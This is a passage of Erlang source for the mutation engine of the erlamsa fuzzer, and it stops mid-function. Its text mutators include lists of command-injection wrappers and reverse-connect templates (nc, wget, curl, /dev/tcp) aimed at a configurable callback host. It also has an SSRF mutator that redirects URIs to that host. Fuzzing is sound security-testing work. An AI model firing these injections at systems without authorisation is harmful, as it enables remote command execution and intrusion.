% Copyright (c) 2011-2014 Aki Helin
% Copyright (c) 2014-2015 Alexander Bolshev aka dark_k3y
%
% Permission is hereby granted, free of charge, to any person obtaining a copy
% of this software and associated documentation files (the "Software"), to deal
% in the Software without restriction, including without limitation the rights
% to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
% copies of the Software, and to permit persons to whom the Software is
% furnished to do so, subject to the following conditions:
%
% The above copyright notice and this permission notice shall be included in
% all copies or substantial portions of the Software.
%
% THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
% IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
% FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT
% SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM,
% DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR
% OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR
% THE USE OR OTHER DEALINGS IN THE SOFTWARE.
%
%%%-------------------------------------------------------------------
%%% @author dark_k3y
%%% @doc
%%% Mutations definitions.
%%% @end
%%%-------------------------------------------------------------------
-module(erlamsa_mutations).
-author("dark_k3y").

-ifdef(TEST).
-include_lib("eunit/include/eunit.hrl").
-compile([export_all]).
-endif.

-include("erlamsa.hrl").

%% API
-export([make_mutator/2, mutators_mutator/1, mutations/0, mutations/1, default/1, tostring/1, 
         get_max_score/0, inner_mutations/0, get_ssrf_uri/0]).
 

-define(MIN_SCORE, 2.0).
-define(MAX_SCORE, 10.0).
-define(RAND_DELTA, 18446744073709551616).

-type byte_edit_fun() :: fun((byte()) -> binary()).
-type text_mutators() :: insert_badness | replace_badness | insert_aaas | insert_null | insert_delimeter.

%% return maximum possible score value
-spec get_max_score() -> float().
get_max_score() ->
    ?MAX_SCORE.

-spec edit_byte_vector(binary(), non_neg_integer(), byte_edit_fun()) -> binary().
%% clone a byte vector and edit at given position
edit_byte_vector(BVec = <<>>, _, _) -> BVec;
edit_byte_vector(BVec, Edit_pos, Func) ->
    Head_cnt = Edit_pos*8,
    <<H:Head_cnt, B:8, T/binary>> = BVec,
    C = Func(B),    
    <<H:Head_cnt, C/binary, T/binary>>.

%%%
%%% Number Mutator
%%%

-spec interesting_numbers() -> list(integer()).
interesting_numbers() ->
    lists:foldl(
        fun (I, Acc) ->
            X = 1 bsl I,
            [X-1, X, X+1 | Acc]
            end,
        [],
        [1, 7, 8, 15, 16, 31, 32, 63, 64, 127, 128]).

-spec sign(integer()) -> integer().
sign(X) when X >= 0 -> 1;
sign(_) -> -1.

-spec mutate_num(integer()) -> integer().
mutate_num(Num) -> mutate_num(Num, erlamsa_rnd:rand(12)).

-spec mutate_num(integer(), 0..12) -> integer().
mutate_num(Num, 0) -> Num + 1; 
mutate_num(Num, 1) -> Num - 1; 
mutate_num(_, 2) -> 0;
mutate_num(_, 3) -> 1;
mutate_num(_, N) when N > 2 andalso N < 7 -> erlamsa_rnd:rand_elem(interesting_numbers());
mutate_num(Num, 7) -> Num + erlamsa_rnd:rand_elem(interesting_numbers());
mutate_num(Num, 8) -> Num - erlamsa_rnd:rand_elem(interesting_numbers());
mutate_num(Num, 9) -> Num - erlamsa_rnd:rand(erlang:abs(Num)*2) * sign(Num); 
mutate_num(Num, _) ->
    N = erlamsa_rnd:rand_range(1, 129),
    L = erlamsa_rnd:rand_log(N),
    S = erlamsa_rnd:rand(3),
    case S of
        0 -> Num - L;
        _Else -> Num + L
    end.

-spec get_num(binary()) -> {integer() | false, binary()}.
get_num(Bin) -> get_num(Bin, 0, 0, 1).

-spec get_num(binary(), integer(), non_neg_integer(), 1 | -1) -> {integer() | false, binary()}.
get_num(<<>>, _, 0, _) -> {false, <<>>};
get_num(<<>>, N, _, Sign) -> {N * Sign, <<>>};
get_num(<<D:8,T/binary>>, N, Digits, Sign) when (D >= 48) and (D =< 57) ->
    get_num(T, D - 48 + N*10, Digits + 1, Sign);
get_num(<<D:8,T/binary>>, N, Digits, _) when (D =:= 45) and (Digits =:= 0) ->
    get_num(T, N, Digits, -1);
get_num(Lst, _, 0, _) -> {false, Lst};
get_num(Lst, N, _, Sign) -> {N * Sign, Lst}.

-spec copy_range(binary(), binary(), binary()) -> binary().
copy_range(Pos, Pos, Tail) -> Tail;
copy_range(<<H:8,T/binary>>, End, Tail) -> NT = copy_range(T, End, Tail), <<H:8, NT/binary>>.

-spec mutate_a_num(binary(), integer()) -> {integer(), binary()}.
mutate_a_num(<<>>, NFound) ->
    Which = erlamsa_rnd:rand(NFound),
    {Which, <<>>};
mutate_a_num(Lst = <<H:8, T/binary>>, NFound) ->
    {ValP, LstP} = get_num(Lst),
    if
        ValP =/= false ->
            {Which, Tail} = mutate_a_num(LstP, NFound + 1),
            case Which of
                0 ->
                    NewNum = mutate_num(ValP),
                    BinNewNum = list_to_bitstring(integer_to_list(NewNum)),
                    {-1, erlamsa_utils:merge(BinNewNum, Tail)};
                _Else ->
                    {Which - 1, copy_range(Lst, LstP, Tail)}
            end;
        true ->
            {Which, Tail} = mutate_a_num(T, NFound),
            {Which, <<H:8, Tail/binary>>}
    end.

-spec sed_num(list_of_bins(), meta_list()) -> mutation_res().
sed_num([H|T], Meta) ->
    {N, Lst} = mutate_a_num(H, 0),  
    IsBin = erlamsa_utils:binarish(Lst),
    FlushedLst = erlamsa_utils:flush_bvecs(Lst, T),
    if
        N =:= 0 ->
            R = erlamsa_rnd:rand(10), %% low priority negative, because could be textual with less frequent numbers
            case R of
                0 -> {fun sed_num/2, FlushedLst, [{muta_num, 0}|Meta], -1};
                _Else -> {fun sed_num/2, FlushedLst, [{muta_num, 0}|Meta], 0}
            end;
        IsBin =:= true ->
            {fun sed_num/2, FlushedLst, [{muta_num, 1}|Meta], -1};
        true ->
            {fun sed_num/2, FlushedLst, [{muta_num, 1}|Meta], +2}
    end.


%%%
%%% Single Byte-level Mutations
%%%
-spec construct_sed_byte_muta(byte_edit_fun(), atom()) -> mutation_fun().
construct_sed_byte_muta(F, Name) ->
    fun Self([H|T], Meta) ->
        P = erlamsa_rnd:rand(byte_size(H)),
        D = erlamsa_rnd:rand_delta(),
        {Self, [edit_byte_vector(H, P, F) | T], [{Name, D}|Meta], D}
    end.

-spec construct_sed_byte_drop() -> mutation_fun().
construct_sed_byte_drop() ->  %% drop byte
    construct_sed_byte_muta(fun (B) -> <<B:0>> end, byte_drop).

-spec construct_sed_byte_inc() -> mutation_fun().
construct_sed_byte_inc() ->  %% inc byte mod 256
    construct_sed_byte_muta(fun (B) -> C = (B + 1) band 255, <<C:8>> end, byte_inc).

-spec construct_sed_byte_dec() -> mutation_fun().
construct_sed_byte_dec() ->  %% dec byte mod 256
    construct_sed_byte_muta(fun (B) -> C = (B - 1) band 255, <<C:8>> end, byte_dec).

-spec construct_sed_byte_repeat() -> mutation_fun().
construct_sed_byte_repeat() ->  %% repeat a byte
    construct_sed_byte_muta(fun (B) -> <<B:8, B:8>> end, byte_repeat).

-spec construct_sed_byte_flip() -> mutation_fun().
construct_sed_byte_flip() ->  %% flip a bit in a byte
    construct_sed_byte_muta(
        fun (B) -> 
            Flip = erlamsa_rnd:rand(8),
            Mask = 1 bsl Flip,
            C = B bxor Mask, 
            <<C:8>> 
        end, byte_flip).

-spec construct_sed_byte_insert() -> mutation_fun().
construct_sed_byte_insert() ->  %% insert a byte
    construct_sed_byte_muta(
        fun (B) -> 
            NewByte = erlamsa_rnd:rand(256),
            <<NewByte:8, B:8>> 
        end, byte_insert).

-spec construct_sed_byte_random() -> mutation_fun().
construct_sed_byte_random() ->  %% swap a byte with a random one
    construct_sed_byte_muta(
        fun (_B) -> 
            NewByte = erlamsa_rnd:rand(256),
            <<NewByte:8>> 
        end, byte_swap_random).

%%%
%%% Multiple Byte-level Mutations
%%%
%%% Warning: this implememntations are not radamsa-like, only making "similar" things, but in the other way and with slight differences

%-spec construct_sed_bytes_muta(byte_edit_fun(), atom()) -> mutation_fun().
-spec construct_sed_bytes_muta(fun(), atom()) -> mutation_fun().
construct_sed_bytes_muta(F, Name) ->
    fun 
    Self([<<>>|BTail], Meta) -> 
        {Self, [<<>>|BTail], [{Name, -1}|Meta], -1};
    Self([BVec|BTail], Meta) ->        
        BSize = byte_size(BVec),        
        S = erlamsa_rnd:rand(BSize), 
        L = erlamsa_rnd:rand_range(1, BSize - S + 1),  
        %% WARN: ^ here any (min 2), in radamsa 20: magic constant, 
        %% should use something like repeat-len
        %% ^^ check may be max(20, ...) with "MAGIX" could be MORE effective
        H_bits = S*8,
        P_bits = L*8, 
        <<H:H_bits, P:P_bits, T/binary>> = BVec,      
        C = F(<<H:H_bits>>, <<P:P_bits>>, T, BTail),
        D = erlamsa_rnd:rand_delta(),
        {Self, C, [{Name, BSize}|Meta], D}
    end.

-spec construct_sed_bytes_perm() -> mutation_fun().
%% WARN: in radamsa max permutation block could not exceed length 20, here could be any length
construct_sed_bytes_perm() -> %% permute a few bytes
    construct_sed_bytes_muta(
        fun (H, Bs, T, BTail) -> 
            C = list_to_binary(
            erlamsa_rnd:random_permutation(
                binary_to_list(Bs))),
            [<<H/binary, C/binary, T/binary>> | BTail]
        end, seq_perm).

-spec construct_sed_bytes_repeat() -> mutation_fun().
construct_sed_bytes_repeat() -> %% repeat a seq
    construct_sed_bytes_muta(
        fun (H, Bs, T, BTail) ->            
            N = max(2, erlamsa_rnd:rand_log(10)), %% max 2^10 = 1024 stuts
            C = list_to_binary([Bs || _ <- lists:seq(1,N)]),
            Res = [<<H/binary, C/binary ,T/binary>> | BTail],
            Res
        end, seq_repeat).

-spec construct_sed_bytes_drop() -> mutation_fun().
construct_sed_bytes_drop() -> %% drop a seq
    construct_sed_bytes_muta(
        fun (H, _Bs, T, BTail) -> 
            [<<H/binary, T/binary>> | BTail] end, seq_drop).


-spec randmask(fun(), list()) -> list().
%% randomly applies maskfunction byte-per-byte to list with pre-randomized prob.
randmask(MaskFun, Ll) ->
    MaskProb = erlamsa_rnd:erand(100),
    randmask_loop(MaskFun, MaskProb, erlamsa_rnd:rand_occurs_fixed(MaskProb, 100), Ll, []).

-spec randmask_loop(fun(), non_neg_integer(), non_neg_integer(), list(), list()) -> list().
randmask_loop(_MaskFun, _MaskProb, _, [], Out) ->
    lists:reverse(Out);
randmask_loop(MaskFun, MaskProb, true, [H | T], Out) -> 
    randmask_loop(MaskFun, MaskProb, erlamsa_rnd:rand_occurs_fixed(MaskProb, 100), T, [MaskFun(H) | Out]);
randmask_loop(MaskFun, MaskProb, false, [H | T], Out) -> 
    randmask_loop(MaskFun, MaskProb, erlamsa_rnd:rand_occurs_fixed(MaskProb, 100), T, [H | Out]).

-spec mask_nand(byte()) -> byte().
mask_nand(B) ->
    B band (bnot (1 bsl erlamsa_rnd:rand(8))).

-spec mask_or(byte()) -> byte().
mask_or(B) ->
    B bor (1 bsl erlamsa_rnd:rand(8)).

-spec mask_xor(byte()) -> byte().
mask_xor(B) ->
    B bxor (1 bsl erlamsa_rnd:rand(8)).

-spec mask_replace(byte()) -> byte().
mask_replace(_) ->
    erlamsa_rnd:rand(256).

-spec construct_sed_bytes_randmask(list(fun())) -> mutation_fun().
%% WARNING: in radamsa max permutation block could not exceed length 20, here could be any length
construct_sed_bytes_randmask(MaskFunList) -> %% permute a few bytes
    MaskFun = erlamsa_rnd:rand_elem(MaskFunList),
    construct_sed_bytes_muta(
        fun (H, Bs, T, BTail) -> 
            C = list_to_binary(
                      randmask(MaskFun, binary_to_list(Bs))),
            [<<H/binary, C/binary, T/binary>> | BTail]
        end, seq_randmask).

%%
%% Lines
%%

-spec lines(binary()) -> [string()].
%% bvec -> ([... , 10] .. [... , 10]), cut after newlines
lines(Bvec) -> lines(binary_to_list(Bvec), [], []).

lines([], [], Out) -> lists:reverse(Out);
lines([], Buff, Out) -> lists:reverse([lists:reverse(Buff)] ++ Out);
lines([10|T], Buff, Out) -> lines(T, [], [lists:reverse([10 | Buff]) | Out]);
lines([H|T], Buff, Out) -> lines(T, [H | Buff], Out).

-spec unlines([string()]) -> binary().
%% Lst -> bvec
unlines(Lst) ->
    lists:foldl(fun (X, Acc) -> C = list_to_binary(X), <<Acc/binary, C/binary>> end, <<>>, Lst).

-spec try_lines(binary()) -> [string()] | false.
%% #u8[byte ...] -> ((byte ... 10) ...) | #false, if this doesn't look like line-based text data
%% TODO: ugly code, need a bit refactor
try_lines(Bvec) ->
    Ls = lines(Bvec),
    IsBin = erlamsa_utils:binarish(Bvec),
    if
        Ls =:= [] -> false;
        IsBin =:= true -> false;
        true -> Ls
    end.

-spec construct_line_muta(fun(), atom()) -> mutation_fun().
construct_line_muta(Op, Name) ->
    fun Self(Ll = [H|T], Meta) ->
        Ls = try_lines(H),        
        if
            Ls =:= false ->
                {Self, Ll, Meta, -1};
            true ->
                MLs = Op(Ls, length(Ls)), % calc length only once
                NH = unlines(MLs),
                {Self, [NH | T], [{Name, 1}|Meta], 1} 
        end
    end. 

-spec construct_st_line_muta(fun(), atom(), list()) -> mutation_fun().
%% state is (n <line> ...)
construct_st_line_muta(Op, Name, InitialState) ->
    fun (Ll = [H|T], Meta) ->
        Ls = try_lines(H),
        if
            Ls =:= false ->
                {construct_st_line_muta(Op, Name, InitialState), 
                    Ll, Meta, -1};
            true ->
                {Stp, NewLs} = Op(InitialState, Ls), 
                {construct_st_line_muta(Op, Name, Stp), 
                    [unlines(NewLs) | T], [{Name, 1} | Meta], 1} 
        end
    end.

%%
%% Shared sequences
%%

-spec sed_fuse_this(list_of_bins(), meta_list()) -> mutation_res().
%% (a b ...) -> (a+a b ...)
sed_fuse_this([H|T], Meta) -> % jump between two shared suffixes in the block
    Lst = binary_to_list(H),    
    B = list_to_binary(erlamsa_fuse:fuse(Lst, Lst)),
    D = erlamsa_rnd:rand_delta(),
    {fun sed_fuse_this/2, [B | T], [{fuse_this, D}|Meta], D}.

-spec sed_fuse_next(list_of_bins(), meta_list()) -> mutation_res().
sed_fuse_next([H|T], Meta) ->
    {Al1, Al2} = erlamsa_utils:halve(binary_to_list(H)),
    {B, Ll} = erlamsa_utils:uncons(T, H), % next or current
    Bl = binary_to_list(B),
    Abl = erlamsa_fuse:fuse(Al1, Bl),
    Abal = erlamsa_fuse:fuse(Abl, Al2),
    D = erlamsa_rnd:rand_delta(),
    {fun sed_fuse_next/2,  
        erlamsa_utils:flush_bvecs(list_to_binary(Abal), Ll), %  <- on avg 1x, max 2x block sizes
        [{fuse_next, D}|Meta], D}.

-spec remember(binary()) -> mutation_fun().
remember(Block) ->
    fun ([H|T], Meta) -> 
        %% TODO: Check -- in radamsa here using owllisp halve instead of split
        {Al1, Al2} = erlamsa_utils:halve(binary_to_list(H)),
        {Ol1, Ol2} = erlamsa_utils:halve(binary_to_list(Block)),
        A = erlamsa_fuse:fuse(Al1, Ol1), % a -> o
        B = erlamsa_fuse:fuse(Ol2, Al2), % o -> a
        Swap = erlamsa_rnd:rand(3),
        D = erlamsa_rnd:rand_delta(),
        NewBlock = case Swap of
                     0 -> H;
                     _Else -> Block
                 end,
        {remember(NewBlock),  
            erlamsa_utils:flush_bvecs(list_to_binary(A), % <- on avg 1x, max 2x block sizes
                 erlamsa_utils:flush_bvecs(list_to_binary(B), T)), 
            [{fuse_old, D}|Meta], D}
    end.

-spec sed_fuse_old(list_of_bins(), meta_list()) -> mutation_res().
 sed_fuse_old(Ll = [H|_], Meta) ->
     R = remember(H),
     R(Ll, Meta).


%%
%% ASCII string mutations (use UTF-8 later)
%%

%%% Text mutations

%% check that the nodes do look stringy enough to mutate with these 
%% heuristics, meaning there are some nodes and/or just one, but it's
%% stringy
%% in radamsa this will stop if found byte node; here, we continue
-spec stringy(list(byte())) -> false | true.
stringy([]) -> false;
stringy([{byte, _} | T]) -> false or stringy(T);
stringy(_) -> true. %% in radamsa -- length(Cs)

-spec silly_strings() -> list(string()).
silly_strings() -> % added \r \n \t \b 
    ["%n", "%n", "%s", "%d", "%p", "%#x", [0], "aaaa%d%n", [10], [13], [9], [8]]. 

-spec delimeters() -> list(string()).
delimeters() ->
    ["'", "\"", "'", "\"", "'", "\"", "&", ":", "|", ";",
     "\\", [10], [13], [9], " ", "`", [0], "]", "[", ">", "<"].

-spec shellinjects() -> list(string()).
shellinjects() -> 
    [
        "';~s;'", "\";~s;\"", ";~s;", "|~s#",
        "^ ~s ^", "& ~s &", "&& ~s &&", "|| ~s ||",
        "%0D~s%0D", "`~s`"  
    ].

-spec revconnects() -> list(string()).
revconnects() -> 
    [
        "calc.exe & notepad.exe ~s ~p ", "nc ~s ~p", "wget http://~s:~p", "curl ~s ~p",
        "exec 3<>/dev/tcp/~s/~p", "sleep 100000 # ~s ~p "
    ].
    
-spec random_badness() -> list().
random_badness() ->
    random_badness(erlamsa_rnd:rand(20) + 1, []).

-spec random_badness(non_neg_integer(), list()) -> list().
random_badness(0, Out) -> Out;
random_badness(N, Out) ->
    X = erlamsa_rnd:rand_elem(silly_strings()),
    random_badness(N - 1, X ++ Out).

-spec overwrite(list(), list()) -> list().
overwrite([], Old) -> Old;
overwrite([H|T], [_|OldT]) ->
    [H | overwrite(T, OldT)];
overwrite([H|T], Old) ->
    [H | overwrite(T, Old)].

-spec rand_as_count() -> non_neg_integer().
rand_as_count() ->
    Type = erlamsa_rnd:rand(11),
    case Type of
        0 -> 127;
        1 -> 128;
        2 -> 255;
        3 -> 256;
        4 -> 16383;
        5 -> 16384;
        6 -> 32767;
        7 -> 32768;
        8 -> 65535;
        9 -> 65536;
        _Else -> erlamsa_rnd:rand(1024)        
    end.

-spec push_as(non_neg_integer(), list()) -> list().
push_as(0, Tail)
    -> Tail;
push_as(N, Tail) ->
    push_as(N - 1, [97 | Tail]).

-spec mutate_text_data(string(), [text_mutators()]) -> string().
mutate_text_data(Lst, TxtMutators) ->
    mutate_text(erlamsa_rnd:rand_elem(TxtMutators), Lst).

-spec buildrevconnect() -> string().
buildrevconnect() ->
    Inj = erlamsa_rnd:rand_elem(shellinjects()),
    Rev = erlamsa_rnd:rand_elem(revconnects()),
    {IP, Port} = get_ssrf_ep(),
    lists:flatten(io_lib:format(Inj, [io_lib:format(Rev, [IP, Port])])).

-spec mutate_text(text_mutators(), string()) -> string().
%% insert badness
mutate_text(insert_badness, []) -> random_badness(); %% empty list -- just insert random
mutate_text(insert_badness, Lst) ->
    P = erlamsa_rnd:erand(length(Lst)), % in erlang lists starts from 1
    Bad = random_badness(),
    erlamsa_utils:applynth(P, Lst, fun(E, R) -> Bad ++ [E|R] end); %% TODO: check before or after E, in radamsa Bad ++ [X],
%% replace badness
mutate_text(replace_badness, []) -> random_badness(); %% empty list -- just replace with random
mutate_text(replace_badness, Lst) ->
    P = erlamsa_rnd:erand(length(Lst)), % in erlang lists starts from 1
    Bad = random_badness(),
    lists:sublist(Lst, P - 1) ++ overwrite(lists:nthtail(P, Lst), Bad);
%% insert as
mutate_text(insert_aaas, []) -> push_as(rand_as_count(), []); %% empty list -- just insert random
mutate_text(insert_aaas, Lst) ->
    N = rand_as_count(),
    P = erlamsa_rnd:erand(length(Lst)), % in erlang lists starts from 1    
    lists:sublist(Lst, P - 1) ++ push_as(N, lists:nthtail(P, Lst));
%% insert null
mutate_text(insert_null, Lst) ->
    Lst ++ [0];
%% insert delimeter
mutate_text(insert_delimeter, []) -> [erlamsa_rnd:rand_elem(delimeters())]; %% empty list -- just insert random
mutate_text(insert_delimeter, Lst) ->
    P = erlamsa_rnd:erand(length(Lst)), % in erlang lists starts from 1
    Bad = erlamsa_rnd:rand_elem(delimeters()),
    erlamsa_utils:applynth(P, Lst, fun(E, R) -> Bad ++ [E|R] end); %% TODO: check before or after E
mutate_text(insert_shellinj, []) -> [erlamsa_rnd:rand_elem(delimeters())]; %% empty list -- just insert random
mutate_text(insert_shellinj, Lst) ->
    P = erlamsa_rnd:erand(length(Lst)), % in erlang lists starts from 1
    ShellInj = buildrevconnect(),
    erlamsa_utils:applynth(P, Lst, fun(E, R) -> ShellInj ++ [E|R] end).

%% Generic ASCII Bad mutation
%% In Radamsa, this function will work only if Cs started as string
%% Else, if Cs contains only byte nodes, it will run infinetely
%% Here, we do maximum L/4 runs in this case
%% TODO: WARN: Ineffective, need rewrite/optimize
-spec string_generic_mutate(chunk_list(), [text_mutators()], non_neg_integer(), non_neg_integer()) -> chunk_list().
string_generic_mutate(Cs, _, L, R) when R > L/4 -> Cs;
string_generic_mutate(Cs, TxtMutators, L, R) ->
    P = erlamsa_rnd:erand(L), % in erlang, list is beginning from index 1
    El = lists:nth(P, Cs),
    case El of 
        {text, Bs} -> 
            Data = mutate_text_data(Bs, TxtMutators),
            erlamsa_utils:applynth(P, Cs, fun(_E, Rest) -> [{text, Data} | Rest] end);  % [Node]
        {byte, _Bs} ->
            string_generic_mutate(Cs, TxtMutators, L, R + 1);
        {delimited, Left, Bs, Right} ->
            erlamsa_utils:applynth(P, Cs, fun (_E, Rest) -> [{delimited, Left, mutate_text_data(Bs, TxtMutators), Right}] ++ Rest end)
    end. 

-spec construct_ascii_mutator(fun(), atom()) -> mutation_fun().
construct_ascii_mutator(Fun, Name) ->
    fun Ascii_mutator (Ll = [H|T], Meta) -> 
        Data = binary_to_list(H),
        Cs = erlamsa_strlex:lex(Data),

        case stringy(Cs) of % in radamsa stringy_length
            true ->   % do something bad...
                Ms = Fun(Cs),
                D = erlamsa_rnd:rand_delta(),        
                BinData = list_to_binary(erlamsa_strlex:unlex(Ms)),
                {Ascii_mutator, 
                    [BinData | T], 
                    [{Name, D}|Meta], D};
            false ->  % not a string at all (even 1 node), skipping
                {Ascii_mutator, Ll, Meta, -1} 
        end
    end.

-spec construct_ascii_bad_mutator() -> mutation_fun().
construct_ascii_bad_mutator() ->    
    construct_ascii_mutator(
        fun (Cs) -> string_generic_mutate(Cs, 
                    [insert_badness, replace_badness, insert_aaas, insert_null], 
                    length(Cs), 0)
        end,
        ascii_bad).

-spec drop_delimeter(non_neg_integer(), chunk()) -> chunk().
%% drop one(both) or zero delimeters
drop_delimeter(0, {delimited, Left, Bs, _Right}) -> % drop right
    {text, [Left|Bs]};
drop_delimeter(1, {delimited, _Left, Bs, Right}) -> % drop left
    {text, Bs ++ [Right]} ;
drop_delimeter(2, {delimited, _Left, Bs, _Right}) -> % drop both
    {text, Bs};
drop_delimeter(_, El) -> % drop none
    El.

%% Play with delimeters
-spec string_delimeter_mutate(chunk_list(), non_neg_integer(), non_neg_integer()) -> chunk_list().
string_delimeter_mutate(Cs, L, R) when R > L/4 -> Cs;
string_delimeter_mutate(Cs, L, R) ->
    P = erlamsa_rnd:erand(L), % in erlang, list is beginning from index 1
    El = lists:nth(P, Cs),
    case El of 
        {text, Bs} -> %% insert or drop special delimeter(s)
            Data = mutate_text_data(Bs, [erlamsa_rnd:rand_elem(
                                            [
                                                insert_delimeter, insert_delimeter, 
                                                insert_delimeter, insert_shellinj                                        
                                            ])
                                        ]),
            erlamsa_utils:applynth(P, Cs, fun(_E, Rest) -> [{text, Data}|Rest] end); % [Node]            
        {byte, _Bs} -> %% do nothing
            string_delimeter_mutate(Cs, L, R + 1);
        {delimited, _Left, _Bs, _Right} ->
            Drop = drop_delimeter(erlamsa_rnd:rand(4), El),
            erlamsa_utils:applynth(P, Cs, fun(_E, Rest) -> [Drop|Rest] end)
    end.

-spec construct_ascii_delimeter_mutator() -> mutation_fun().
construct_ascii_delimeter_mutator() ->    
    construct_ascii_mutator(
        fun (Cs) -> string_delimeter_mutate(Cs, length(Cs), 0)
        end,
        ascii_delimeter).

%% 
%% Base64 Mutator
%%

-spec base64_mutator(list_of_bins(), meta_list()) -> mutation_res().
base64_mutator([H|T], Meta) ->
    Data = binary_to_list(H),
    Cs = erlamsa_strlex:lex(Data),
    MutasList = mutas_list(erlamsa_mutations:mutations([])),
    %io:format("~p ~n", [Cs]),

    {Ms, {NewD, NewMeta}} = lists:mapfoldl( 
        fun 
            ({text, A}, Acc = {DAcc, MAcc}) when length(A) > 6 ->
                try base64:decode(A) of
                    Bin -> 
                        D = erlamsa_rnd:rand_delta(),
                        Muta = mutators_mutator(MutasList, []),
                        {_, NewLl, AddedMeta} = Muta([Bin], []),
                        NewBin = erlang:iolist_to_binary(NewLl),
                        {
                            {text, base64:encode_to_string(NewBin)}, 
                            {DAcc + D, [AddedMeta, {base64_mutator, D} | MAcc]}
                        }
                catch 
                    error:badarg ->
                        {{text, A}, Acc};
                    error:function_clause ->
                        {{text, A}, Acc}
                end;
            (Lex, Acc) -> {Lex, Acc}
        end, 
        {-1, Meta}, Cs),
    %io:format("~p~n", [Ms]),
    BinData = list_to_binary(erlamsa_strlex:unlex(Ms)),
    {fun base64_mutator/2, [BinData | T], NewMeta, NewD}.


%% 
%% URI SSRF Mutator
%%

-spec get_ssrf_ep() -> {string(), integer()}.
get_ssrf_ep() -> 
    SSRFPort = case ets:match(global_config, {cm_port, '$1'}) of
        [[Port]] -> Port;
        _ -> 51234
    end,
    SSRFSystemHost = case ets:match(global_config, {cm_host, '$1'}) of
        [[SHost]] -> SHost;
        _ -> {}
    end,
    SSRFUserHost = case ets:match(global_config, {cm_host_user, '$1'}) of
        [[UHost]] -> UHost;
        _ -> {}
    end,
    SSRFHost = case {SSRFSystemHost, SSRFUserHost} of
        {{}, {}} -> "localhost";
        {SSRFSystemHost, {}} -> inet:ntoa(SSRFSystemHost);
        {_, SSRFUserHost} -> SSRFUserHost;
        _ -> "localhost"
    end,
    {SSRFHost, SSRFPort}.

-spec get_ssrf_uri() -> list().
get_ssrf_uri() -> 
    {SSRFHost, SSRFPort} = get_ssrf_ep(),
    io_lib:format("://~s:~p/", [SSRFHost, SSRFPort]).

%% replace file with http
-spec change_scheme(list()) -> list().
change_scheme([$e, $l, $i, $f | T]) -> lists:reverse([$p, $t, $t, $h | T]);
change_scheme(Lst) -> lists:reverse(Lst).

-spec rand_uri_mutate(string(), string(), integer()) -> {string(), integer(), list()}.
rand_uri_mutate(T, Acc, 1) ->
    {change_scheme(Acc) ++ get_ssrf_uri() ++ T, 1, {uri, success}};
rand_uri_mutate(T, Acc, 2) ->
    {SSRFHost, SSRFPort} = get_ssrf_ep(), 
    AtAddr = lists:flatten(io_lib:format(" @~s:~p", [SSRFHost, SSRFPort])),
    [Domain, Query] = string:split(T, "/"),
    Modified = lists:flatten([change_scheme(Acc), "://", Domain, AtAddr, $/, Query]),
    {Modified, 1, {uri, success}}.

-spec try_uri_mutate(list()) -> {list(), integer(), list()}.
try_uri_mutate(Lst) -> try_uri_mutate(Lst, []).

-spec try_uri_mutate(list(), list()) -> {list(), integer(), list()}.
try_uri_mutate([ $:, $/, $/ | T], Acc) ->
    rand_uri_mutate(T, Acc, erlamsa_rnd:erand(2));
try_uri_mutate([], Acc) -> {lists:reverse(Acc), 0, []};
try_uri_mutate([H|T], Acc) -> 
    try_uri_mutate(T, [H|Acc]).

-spec uri_mutator(list_of_bins(), meta_list()) -> mutation_res().
uri_mutator([H|T], Meta) ->
    Cs = erlamsa_strlex:lex(binary_to_list(H)),
    
    {Ms, {NewD, NewMeta}} = lists:mapfoldl( 
        fun 
            ({text, A}, {DAcc, MAcc}) when length(A) > 5 ->
                {NewA, NewD, NewMeta} = try_uri_mutate(A),
                {{text, NewA}, {DAcc + NewD, [NewMeta | MAcc]}};
            (Lex, Acc) -> {Lex, Acc}
        end, 
        {-1, Meta}, Cs),

    BinData = list_to_binary(erlamsa_strlex:unlex(Ms)),
    {fun base64_mutator/2, [BinData | T], NewMeta, NewD}.


%%
%% Guessed Parse-tree Mutations
%%

-spec usual_delims(non_neg_integer()) -> non_neg_integer() | false.
%% ?? could be settable from command line
usual_delims(40) -> 41;   % ()
usual_delims(91) -> 93;   % []
usual_delims(60) -> 62;   % <>
usual_delims(123) -> 125; % {}
usual_delims(34) -> 34;   % ""
usual_delims(39) -> 39;   % ''
usual_delims(_) -> false.

-spec grow(list(), byte(), list()) -> {list(), list() | false}.
%% -> lst #false = ran out of data trying to parse up to close, but lst is the same with partial parsing
%% -> lst tail-lst = did successfully parse up to close. ready node is lst, tail is following data
grow([], _Close, Rout) ->  %% out of data, didn't find close. return partial parse.
    {lists:reverse(Rout), false};    
grow([H|T], Close, Rout) when H =:= Close -> %% match complete, return with rest of list
    {lists:reverse([Close | Rout]), T};
grow([H|T], Close, Rout) ->
    Next_close = usual_delims(H),
    case Next_close of
        false -> %% add one byte to this node
            grow(T, Close, [H | Rout]);
        _Else -> 
            {This, Lst} = grow(T, Next_close, []),
            if  %% we didn't run out of data and this is a single tree node
                Lst =:= false ->                    
                    {lists:reverse(Rout) ++ [H | This], false};
                    %% we ran out of data. this is a list of partial parses (having the data of
                    %% lst after hd in some form) which we want to preserve as tail
                true ->
                    grow(Lst, Close, [[H | This] | Rout])
            end
    end.

% -spec count_nodes(list()) -> non_neg_integer().
% %% count how many list nodes are in a tree structure
% count_nodes(Lst) -> count_nodes(Lst, 0).

% -spec count_nodes(list(), non_neg_integer()) -> non_neg_integer().
% count_nodes([], N) -> N;
% count_nodes([H|T], N) when is_list(H) -> 
%     count_nodes(T, count_nodes(H, N+1));
% count_nodes([_|T], N) ->
%     count_nodes(T, N).

-spec sublists(list()) -> list().
%% lst -> a list of lists (not counting tails) in lst, when walked recursively, not counting lst itself
sublists(Lst) -> sublists(Lst, []).

-spec sublists(list(), list()) -> list().
sublists([], Found) -> Found;
sublists([H|T], Found) when is_list(H) ->
    sublists(T, sublists(H, [H|Found]));
sublists([_H|T], Found) ->
    sublists(T, Found).

-spec pick_sublist(list()) -> list().
pick_sublist(Lst) ->
    Subs = sublists(Lst),
    case Subs of
        [] -> false;
        _Else ->
            erlamsa_rnd:rand_elem(Subs) 
